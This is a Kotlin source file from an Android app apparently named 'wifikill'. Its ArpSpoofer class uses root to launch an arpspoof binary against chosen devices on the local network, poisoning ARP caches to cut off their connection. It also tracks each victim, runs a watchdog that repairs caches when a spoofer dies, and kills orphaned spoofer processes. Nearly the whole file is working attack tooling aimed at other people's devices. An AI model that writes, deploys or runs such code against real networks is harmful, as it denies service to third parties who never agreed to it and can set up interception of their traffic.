package dev.a99.wifikill

import android.content.Context
import android.os.Process
import dev.a99.wifikill.model.Host
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.SharedFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.util.concurrent.ConcurrentHashMap

class ArpSpoofer(private val context: Context) {

    /** Everything needed to SIGTERM the spoofer or fire a rescue burst. */
    private class Victim(
        val ip: String,
        val mac: String,
        val pid: Int,
        val iface: String,
        val gatewayIp: String,
        val gatewayMac: String,
    )

    private val victims = ConcurrentHashMap<String, Victim>()

    private val _deaths = MutableSharedFlow<String>(extraBufferCapacity = 8)

    /** IPs whose spoofer process vanished without being asked to stop. */
    val deaths: SharedFlow<String> = _deaths

    private var watchdogJob: Job? = null

    private fun getNetworkInfo(): NetworkScanner.NetworkInfo =
        NetworkScanner(context).getNetworkInfo()

    suspend fun getGatewayMac(gatewayIp: String): String? {
        // /proc/net/arp is not readable by apps on modern Android (SELinux),
        // so read it through root.
        val result = RootExecutor.exec("cat /proc/net/arp")
        if (result.exitCode != 0) return null
        return result.stdout
            .drop(1)
            .firstOrNull { it.startsWith(gatewayIp + " ") }
            ?.split(Regex("\\s+"))
            ?.getOrNull(3)
            ?.lowercase()
            ?.takeIf { it != "00:00:00:00:00:00" }
    }

    suspend fun kill(host: Host): Boolean = withContext(Dispatchers.IO) {
        if (victims.containsKey(host.ip)) return@withContext true
        val info = getNetworkInfo()
        val gatewayMac = getGatewayMac(info.gatewayIp)
            ?: return@withContext false
        val binary = BinaryDeployer.deploy(context, "arpspoof").absolutePath
        // The last argument is our own pid: arpspoof watches it and restores
        // the victim by itself if this app dies before sending a SIGTERM.
        val cmd = "$binary ${info.iface} ${host.ip} ${host.mac} " +
            "${info.gatewayIp} $gatewayMac ${Process.myPid()}"
        val pid = RootExecutor.startDetached(cmd)
        if (pid <= 0 || !pidAlive(pid)) return@withContext false
        victims[host.ip] = Victim(
            ip = host.ip,
            mac = host.mac,
            pid = pid,
            iface = info.iface,
            gatewayIp = info.gatewayIp,
            gatewayMac = gatewayMac,
        )
        true
    }

    fun unkill(host: Host) {
        victims.remove(host.ip)?.let { RootExecutor.terminate(it.pid) }
    }

    fun unkillAll() {
        victims.values.forEach { RootExecutor.terminate(it.pid) }
        victims.clear()
    }

    /**
     * Gracefully stop spoofers orphaned by an earlier crashed session:
     * their SIGTERM handler repairs each victim's ARP cache on the way out.
     */
    suspend fun sweepOrphans() = withContext(Dispatchers.IO) {
        val bin = File(File(context.filesDir, "bin"), "arpspoof").absolutePath
        RootExecutor.exec("pkill -TERM -f '$bin'", timeoutMs = 5000)
    }

    /**
     * Poll all active spoofer pids in one su round-trip every few seconds.
     * A spoofer that died unexpectedly (SIGKILL via phantom killer, LMK,
     * crash) never ran its own restore, so fire a corrective burst now and
     * report the victim as unblocked.
     */
    fun startWatchdog(scope: CoroutineScope) {
        if (watchdogJob?.isActive == true) return
        watchdogJob = scope.launch {
            while (isActive) {
                delay(5000)
                val snapshot = victims.values.toList()
                if (snapshot.isEmpty()) continue
                val dead = findDeadPids(snapshot.map { it.pid })
                for (victim in snapshot.filter { it.pid in dead }) {
                    victims.remove(victim.ip)
                    rescue(victim)
                    _deaths.emit(victim.ip)
                }
            }
        }
    }

    private suspend fun findDeadPids(pids: List<Int>): Set<Int> =
        withContext(Dispatchers.IO) {
            val list = pids.joinToString(" ")
            val result = RootExecutor.exec(
                "for p in $list; do kill -0 \$p 2>/dev/null || echo \$p; done"
            )
            result.stdout.mapNotNull { it.trim().toIntOrNull() }.toSet()
        }

    /** Best-effort one-shot ARP repair for a victim left poisoned. */
    private suspend fun rescue(victim: Victim) {
        runCatching {
            val binary = BinaryDeployer.deploy(context, "arpspoof").absolutePath
            val cmd = "$binary --restore-only ${victim.iface} ${victim.ip} " +
                "${victim.mac} ${victim.gatewayIp} ${victim.gatewayMac}"
            RootExecutor.exec(cmd, timeoutMs = 8000)
        }
    }

    private fun pidAlive(pid: Int): Boolean = try {
        val p = Runtime.getRuntime().exec(arrayOf("su", "-c", "kill -0 $pid"))
        p.waitFor() == 0
    } catch (_: Exception) {
        false
    }
}
